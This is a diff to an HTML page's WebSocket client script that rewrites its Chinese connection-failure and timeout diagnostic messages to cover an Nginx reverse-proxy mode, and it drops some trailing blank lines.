@@ -2548,7 +2165,7 @@
                     console.error("连接异常关闭诊断：");
                     console.error("  - 服务器地址:", ip);
                     console.error("  - 连接URL: " + getWebSocketProtocol() + ip.replace(/\/$/, '') + "/ws");
-                    console.error("  - 可能原因: 1)服务器未运行 2)端口未开放 3)防火墙阻止 4)网络不通");
+                    console.error(webSocketProxyMode ? "  - 可能原因: 1)Java服务未运行 2)Nginx /ws 反代或会话校验异常 3)登录会话过期" : "  - 可能原因: 1)服务器未运行 2)端口未开放 3)防火墙阻止 4)网络不通");
                 }
                 
                 if(event.code !== 1000 && reconnectAttempts < maxReconnectAttempts) {
@@ -2649,7 +2266,7 @@
                     connectionTimeout = setTimeout(function() {
                         if(socket && socket.readyState !== WebSocket.OPEN) {
                             console.error("WebSocket连接超时（10秒）");
-                            showError("连接超时：无法在10秒内连接到服务器。请检查：1)服务器是否运行 2)端口8888是否开放 3)防火墙设置", 10000);
+                            showError(webSocketProxyMode ? "连接超时：请检查 Java 服务、Nginx /ws 反向代理和当前登录会话。" : "连接超时：请检查服务器是否运行、8888 端口和防火墙设置。", 10000);
                             updateConnectionStatus('error', '连接超时');
                             try {
                                 socket.close();
@@ -2838,9 +2455,5 @@
             }
         }
     </script>
-               
-               
-           
-               
 </body>
 </html>
